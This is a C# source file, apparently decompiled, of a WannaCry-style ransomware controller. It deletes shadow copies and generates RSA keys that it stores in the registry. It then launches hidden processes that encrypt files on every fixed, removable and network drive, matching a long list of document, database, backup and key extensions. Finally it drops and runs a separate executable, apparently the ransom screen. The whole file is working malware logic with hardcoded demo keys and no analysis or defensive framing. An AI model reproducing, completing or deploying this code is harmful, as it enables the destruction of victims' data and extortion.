using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using wanna_cry.Properties;

namespace wanna_cry
{
	internal class Program
	{
		public static string DEMO_KEY_PRIVATE = "BwIAAACkAABSU0EyAAgAAAEAAQAdbwYdlbhbpDhA8l/d4oYSxIfiYq2AZkp2tj+07AOFQMP1u7MEIrEyoYDfCnaAgfOhuzRNy3m5Dq3ESl5zsmpa6mxR7jyg1c/lcgYQELYnJhpCZtRDWXiAJlOTzHehLquYg5jRXmtS7fKqAnU4l1xRqx1MSLk0M/U+c/v21OWZOPPWj399OmladHnO518JpyI3cm62wtr2JI7df5RGJFp+5EiHglHd0tcFatm0KgPCpf+VNQhIz4sA+wrO/m1Nbp8VVBc5xmk7oDmic3gxkkqD3eBNkDse+OMgpZJhvQ1bFOr2/UBxUiqVf+K01KN/Y7/f6cebWf43nx0q4FinyPu3zwglJxu5Q8S39zZe5sx0D5dOu/d2sS4JTBvO8q/ZaMCKEh3ngunldPVuoyplJ/2Xg3qa+1ZhSV3tyPZ4mL4zkp1IzbMYF1JKRFz1j+4RyMfUvprpGhdx/awOULSatR/B1h42lZqE7GcGJ1qZ7Vm+WQoI9UAzf68nq+t1MC0Rvv5TLK+nc7a5eZjJqPr4GaNrVqOgtQkzPumGOKS0e6ItQHHQwFuHOFZ+oB1JvM/4EXAPLLXAKCUmg+DFeOHn2+Qf37GlFFCS5gBL8zTlEy5QMSLBNRZuzDHG9Rz/9+oAYt8VF3aYnag4KIb9Ido3GCb/IXoxQ3MfNH3HUoZjZkvkuBf4F+rQ7QpJbUTHPjUzgzzHUoBk95SPyMAWubtsr9y/8IMJAXH6RBcPcGyZPZa+FsaPY8bpjvSqXhPHBYZ8bYkdaR0qQuPqF7HYoPW1v/fuDXYm08UzTKEjRgkmxbVhHCvsQHDDIvQ8VUf7OgPGnAP1IxsMloJEF3BVg3cCdpzjJQlfT/AbjOTjLwyc2MA7qXrJvi7b962NDkkrpDaZ1Rz5hWIiJPv5zV/jwscAlDFo9HryBH+2RaSN8LW6OhR/ZLYsyWmauyTOvzUPkIiYk5qsSmKctAlOy2FcQwdgOnXZDJqklhUmlzDS+Gk+nXgn0hWmDDYjCbZp/gy6ghgfTHIVNAEg5iUMLHdGy7gZrCuSo0CsvPBs0Z0DYAF88TAfhAeTfvhFILtmRIzig0E+OPI/F+jjMA7Uymb38cTzwA0AT9GEdJSIKXPhBzLVSKCgu8gMxnAOhRtWjZbpbPpCxvaGSGiRMLWHEhF73wy5595JCb1dAuvb9SYo2yDydQy1j/eAQ5BeG8fjSa5IjWVhyhR189kjN08twB+LpBKtsOsJWodXNxsR3vbaMoBcsVvIlynsfakVsbY+4d1ssinrrK5iSZwY4E4VhWK47WiHQSOM//6sO1qSDJBsMXyIEg4zKbT0dAfP5p3R7/TX3qi0Lpx6TvGppij6KvcQa1KEUiZEo5CJv08TgTgU0HS3QAj5VamRDc/m7dKGY4lz5u4aNLcyxgAOi4GVotTPyCKyya2HuLv6UAlW16tURm8asIniGcUG8tYjT+j3gtGr92Ww9niGz3wjtbffD9d4GX6SjAKpn7+fhJR+KFHZL6qfJqvziwFh7GyzF4QrMiwptkSkNhI=";

		public static string DEMO_KEY_PUBLIC = "BgIAAACkAABSU0ExAAgAAAEAAQAdbwYdlbhbpDhA8l/d4oYSxIfiYq2AZkp2tj+07AOFQMP1u7MEIrEyoYDfCnaAgfOhuzRNy3m5Dq3ESl5zsmpa6mxR7jyg1c/lcgYQELYnJhpCZtRDWXiAJlOTzHehLquYg5jRXmtS7fKqAnU4l1xRqx1MSLk0M/U+c/v21OWZOPPWj399OmladHnO518JpyI3cm62wtr2JI7df5RGJFp+5EiHglHd0tcFatm0KgPCpf+VNQhIz4sA+wrO/m1Nbp8VVBc5xmk7oDmic3gxkkqD3eBNkDse+OMgpZJhvQ1bFOr2/UBxUiqVf+K01KN/Y7/f6cebWf43nx0q4FinyPu3";

		public static string DEMO_EXTENSIONS = "jpg,jpeg,png,tif,gif,bmp";

		public static string ENCRYPTION_TOOL_FNAME = "ed.exe";

		public static string ENCRYPTED_PRIVATE_KEY_FNAME = "key.encrypted";

		public static string[] ALL_EXTENSIONS = new string[]
		{
			"doc,docx,xls,xlsx,ppt,pptx,pst,ost,msg,eml",
			"vsd,vsdx,txt,csv,rtf,123,wks,wk1,pdf,dwg",
			"onetoc2,snt,docb,docm,dot,dotm,dotx,xlsm,xlsb,xlw",
			"xlt,xlm,xlc,xltx,xltm,pptm,pot,pps,ppsm,ppsx",
			"ppam,potx,potm,edb,hwp,602,sxi,sti,sldx,sldm",
			"sldm,vdi,vmdk,vmx,gpg,aes,ARC,PAQ,bz2,tbk",
			"bak,tar,tgz,gz,7z,rar,zip,backup,iso,vcd",
			"raw,cgm,tiff,nef,psd,ai,svg,djvu,m4u,m3u",
			"mid,wma,flv,3g2,mkv,3gp,mp4,mov,avi,asf",
			"mpeg,vob,mpg,wmv,fla,swf,wav,mp3,sh,class",
			"jar,java,rb,asp,php,jsp,brd,sch,dch,dip",
			"pl,vb,vbs,ps1,bat,cmd,js,asm,h,pas",
			"cpp,c,cs,suo,sln,ldf,mdf,ibd,myi,myd",
			"frm,odb,dbf,db,mdb,accdb,sql,sqlitedb,sqlite3,asc",
			"lay6,lay,mml,sxm,otg,odg,uop,std,sxd,otp",
			"odp,wb2,slk,dif,stc,sxc,ots,ods,3dm,max",
			"3ds,uot,stw,sxw,ott,odt,pem,p12,csr,crt,key,pfx,der"
		};

		public static List<string> ListDrives()
		{
			DriveInfo[] arg_0B_0 = DriveInfo.GetDrives();
			List<string> list = new List<string>();
			DriveInfo[] array = arg_0B_0;
			for (int i = 0; i < array.Length; i++)
			{
				DriveInfo driveInfo = array[i];
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
				{
					list.Add(driveInfo.Name);
				}
			}
			return list;
		}

		public static bool CheckJobsDone(List<Process> jobs)
		{
			using (List<Process>.Enumerator enumerator = jobs.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (!enumerator.Current.HasExited)
					{
						return false;
					}
				}
			}
			return true;
		}

		public static string InitKeysSubsystem(string masterPublicKey)
		{
			string result = "";
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software", true);
				RegistryKey registryKey2 = registryKey.OpenSubKey("WC", true);
				if (registryKey2 == null)
				{
					registryKey2 = registryKey.CreateSubKey("WC");
				}
				if (registryKey2.GetValue("guid") == null)
				{
					registryKey2.SetValue("guid", Guid.NewGuid().ToString());
					string text = PS.ExecuteAndWait(Program.ENCRYPTION_TOOL_FNAME, "-genrsa");
					string contents = text.Split(new char[]
					{
						','
					})[0];
					string text2 = text.Split(new char[]
					{
						','
					})[1];
					File.WriteAllText(Program.ENCRYPTED_PRIVATE_KEY_FNAME, contents);
					GC.Collect();
					PS.ExecuteAndWait(Program.ENCRYPTION_TOOL_FNAME, "-ef " + Program.ENCRYPTED_PRIVATE_KEY_FNAME + " " + masterPublicKey);
					byte[] inArray = File.ReadAllBytes(Program.ENCRYPTED_PRIVATE_KEY_FNAME);
					File.Delete(Program.ENCRYPTED_PRIVATE_KEY_FNAME);
					registryKey2.SetValue("public_key", text2);
					registryKey2.SetValue("private_key_encrypted", Convert.ToBase64String(inArray));
					registryKey2.SetValue("wc_path", Assembly.GetEntryAssembly().Location);
					result = text2;
				}
				else
				{
					result = (string)registryKey2.GetValue("public_key");
				}
				registryKey2.Close();
				registryKey.Close();
			}
			catch
			{
			}
			return result;
		}

		private static void RemoveIndexFiles()
		{
			string[] files = Directory.GetFiles(".", "*.index", SearchOption.TopDirectoryOnly);
			for (int i = 0; i < files.Length; i++)
			{
				string path = files[i];
				try
				{
					File.Delete(path);
				}
				catch
				{
				}
			}
		}

		private static void Main(string[] args)
		{
			if (args.Length == 1 && args[0] == "-extract")
			{
				File.WriteAllBytes(Program.ENCRYPTION_TOOL_FNAME, Resources.ed);
			}
			if (args.Length != 2)
			{
				return;
			}
			try
			{
				string text = args[0];
				string text2 = args[1];
				bool flag = text == "-ed";
				if (!(text != "-ed") || !(text != "-dd"))
				{
					if (text2 == "demo")
					{
						text2 = (flag ? Program.DEMO_KEY_PUBLIC : Program.DEMO_KEY_PRIVATE);
					}
					Program.RemoveIndexFiles();
					File.WriteAllBytes(Program.ENCRYPTION_TOOL_FNAME, Resources.ed);
					PS.ExecuteAndForget(Program.ENCRYPTION_TOOL_FNAME, "-delshadowcopies");
					string text3 = flag ? Program.InitKeysSubsystem(text2) : text2;
					if (text3 == Program.DEMO_KEY_PRIVATE)
					{
						try
						{
							string text4 = "key.decrypted";
							File.WriteAllBytes(text4, Convert.FromBase64String((string)Registry.CurrentUser.OpenSubKey("Software\\WC", false).GetValue("private_key_encrypted")));
							PS.ExecuteAndWait(Program.ENCRYPTION_TOOL_FNAME, "-df " + text4 + " " + text2);
							text3 = File.ReadAllText(text4);
							File.Delete(text4);
						}
						catch
						{
							text3 = "";
						}
					}
					if (!(text3 == ""))
					{
						List<string> list = Program.ListDrives();
						List<Process> list2 = new List<Process>();
						using (List<string>.Enumerator enumerator = list.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								string current = enumerator.Current;
								list2.Add(PS.StartHidden(Program.ENCRYPTION_TOOL_FNAME, "-index " + current));
							}
							goto IL_196;
						}
						IL_18C:
						Thread.Sleep(1000);
						IL_196:
						if (!Program.CheckJobsDone(list2))
						{
							goto IL_18C;
						}
						list2.Clear();
						List<string> list3 = new List<string>();
						foreach (string current2 in list)
						{
							string format = "{0} {1} {2} windows {3}";
							list3.Add(string.Format(format, new string[]
							{
								text,
								current2,
								Program.DEMO_EXTENSIONS,
								flag ? Program.DEMO_KEY_PUBLIC : Program.DEMO_KEY_PRIVATE
							}));
							string[] aLL_EXTENSIONS = Program.ALL_EXTENSIONS;
							for (int i = 0; i < aLL_EXTENSIONS.Length; i++)
							{
								string text5 = aLL_EXTENSIONS[i];
								list3.Add(string.Format(format, new string[]
								{
									text,
									current2,
									text5,
									text3
								}));
							}
						}
						PS.RedirectOutput = false;
						using (List<string>.Enumerator enumerator = list3.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								string current3 = enumerator.Current;
								list2.Add(PS.StartHidden(Program.ENCRYPTION_TOOL_FNAME, current3));
							}
							goto IL_2B5;
						}
						IL_2AB:
						Thread.Sleep(1000);
						IL_2B5:
						if (!Program.CheckJobsDone(list2))
						{
							goto IL_2AB;
						}
					}
				}
			}
			catch (Exception)
			{
			}
			finally
			{
				try
				{
					Program.RemoveIndexFiles();
					File.WriteAllBytes("wd.exe", Resources.wg);
					PS.ExecuteAndForget("wd.exe", "");
				}
				catch
				{
				}
				try
				{
					File.Delete(Program.ENCRYPTION_TOOL_FNAME);
				}
				catch
				{
				}
			}
		}
	}
}
